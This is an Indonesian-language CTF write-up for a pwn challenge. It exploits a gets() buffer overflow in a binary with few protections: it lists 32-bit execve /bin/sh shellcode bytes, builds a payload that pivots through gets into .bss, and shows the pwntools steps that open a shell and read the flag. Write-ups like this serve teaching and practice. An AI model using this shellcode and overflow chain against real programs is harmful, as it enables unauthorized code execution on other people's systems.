Diberikan suatu file binary. File tersebut meminta masukan input lalu mencetak ulang input tersebut. Penerimaan input menggunakan
fungsi gets yang vulnerable terhadap buffer overflow. Setelah di periksa keamanannya dengan command "checksec" ternyata proteksi
file binary tersebut sangat minim, sehingga kita bisa melakukan eksekusi shellcode.

```
Hal-hal yang dibutuhkan:
1. Alamat "call gets"
2. Alamat bss
```
Kita membutuhkan alamat .bss untuk menyimpan dan mengeksekusi shellcode, karena data yang ada di .bss merupakan data executable.
Kita juga membutuhkan fungsi gets sebagai media untuk menyimpan input ke bss.

```
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
peilot = 'A'*(0x44+4)+p32(gets_call)+p32(bss_address)+p32(bss_address)
```
Karakter 'A'*(0x44+4) untuk menimpa buffer, lalu alamat call gets untuk memanggil gets, lalu alamat bss sebagai return address,
lalu alamat bss lagi sebagai argumen dari fungsi gets (tempat menyimpan teks yang di terima gets).

```
Eksekusi :
p.sendline(peilot)
p.sendline(shellcode)
p.interactive()
$ ls
$ cat flag
```
